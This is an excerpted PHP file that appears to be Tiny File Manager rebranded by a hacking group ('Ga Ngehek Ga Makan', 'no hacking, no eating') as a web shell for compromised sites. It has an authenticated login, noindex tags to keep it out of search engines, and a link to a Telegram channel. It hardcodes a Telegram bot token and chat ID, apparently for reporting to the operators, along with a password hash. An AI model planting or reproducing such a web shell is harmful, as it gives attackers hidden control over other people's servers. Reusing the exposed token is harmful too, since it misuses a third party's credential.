<?php
session_start();  // Mulai sesi untuk menyimpan waktu pengiriman pesan
...
$token = "6533610887:AAEdXcuNS0b0Hts-bhh6MM-Nm8-YTROzHno";
$chatId = "6324264946";
...
define('APP_TITLE', 'Manusia Biasa');

// Pengaturan otentikasi
$use_auth = true;
$auth_users = array(
    'manbia' => '$2b$10$f7wCwAYcuxiP3pGTixphAeD2oVOwIhBrGTncZoOJMKhwB7rs4f7d2'
);

// Pengguna yang hanya dapat membaca (readonly)
    ...
    if (isset($_SESSION[FM_SESSION_ID]['logged'], $auth_users[$_SESSION[FM_SESSION_ID]['logged']])) {
        ...
        if(function_exists('password_verify')) {
            if (isset($auth_users[$_POST['fm_usr']]) && isset($_POST['fm_pwd']) && password_verify($_POST['fm_pwd'], $auth_users[$_POST['fm_usr']]) && verifyToken($_POST['token'])) {
                ...
                unset($_SESSION[FM_SESSION_ID]['logged']);
                fm_set_msg(lng('NIK ATAU KODE SALAH LO MAU NGAPAIN ANJG?!!'), 'error');
                fm_redirect(FM_SELF_URL);
            }
        } else {
        ...
        <section class="h-100">
                        ...
                        <div class="card fat <?php echo fm_get_theme(); ?>">
                            <div class="card-body">
                                <form class="form-signin" action="" method="post" autocomplete="off">
                                    ...
                                    <div class="mb-3">
                                        <label for="fm_pwd" class="pb-2"><?php echo lng('KODE'); ?></label>
			...
			<a href="https://t.me/pasukantinggi" target="_blank" class="text-decoration-none text-muted">© 2023 Manusia Biasa</a>
                        </div>
                    </div>
                </div>
            </div>
            ...
            <div class="card-body">
                <div class="row">
                    <div class="col-xs-12 col-sm-6">
                        <p>
			<h3>
			<a href="#" target="_blank" class="app-v-title">Manusia Biasa- <?php echo VERSION; ?></a></h3></p>
                        <p>Author: Manusia Biasa</p>
                        <p>Mail Us: <a href="#">ManusiaBiasa[at]gmail.com</a> </p>
                    </div>
                    <div class="col-xs-12 col-sm-6">
                        <div class="card">
...
<form action="" method="post" class="pt-3">
    ...
    <div class="row">
        ...
        <div class="col-3 d-none d-sm-block"><a href="https://tinyfilemanager.github.io" target="_blank" class="float-right text-muted">Manusia Biasa <?php echo VERSION; ?></a></div>
        <?php else: ?>
            <div class="col-12"><a href="https://tinyfilemanager.github.io" target="_blank" class="float-right text-muted">Ga Ngehek Ga Makan<?php echo VERSION; ?></a></div>
        <?php endif; ?>
    </div>
</form>
...
<head>
    ...
    <meta name="description" content="Manusia Biasa">
    <meta name="author" content="GA NGEHEK GA TINGGI">
    ...
    <style>
        /* Menambahkan gambar latar belakang yang diulang */
        body.fm-login-page {
            background-color: #000000;
            font-size: 14px;
            background-image: url('https://i.ibb.co.com/jWwfQzP/Eyy.jpg'); /* Ganti dengan path gambar */
            background-repeat: repeat; /* Mengulang gambar di seluruh halaman */
            background-size: auto; /* Ukuran gambar tetap sesuai dengan ukuran asli */
            background-position: top left; /* Menempatkan gambar di kiri atas */
        }

        /* Styling untuk elemen login */
        .fm-login-page .brand {
            width: 121px;
            overflow: hidden;
            margin: 0 auto;
...
<head>
    ...
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="Manusia Biasa">
    <meta name="author" content="Ga Ngehek Ga Makan">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <?php if($favicon_path) { echo '<link rel="icon" href="'.fm_enc($favicon_path).'" type="image/png">'; } ?>
    <title><?php echo fm_enc(APP_TITLE) ?></title>
...
function lng($txt) {
    ...
    // English Language
    $tr['en']['AppName']        = 'Ga Ngehek Ga Makan';      $tr['en']['AppTitle']           = 'Ga Ngehek Ga Makan';
    ...
    $tr['en']['NIK ATAU KODE SALAH LO MAU NGAPAIN ANJG?!!'] = 'NIK ATAU KODE SALAH LO MAU NGAPAIN ANJG?!!';
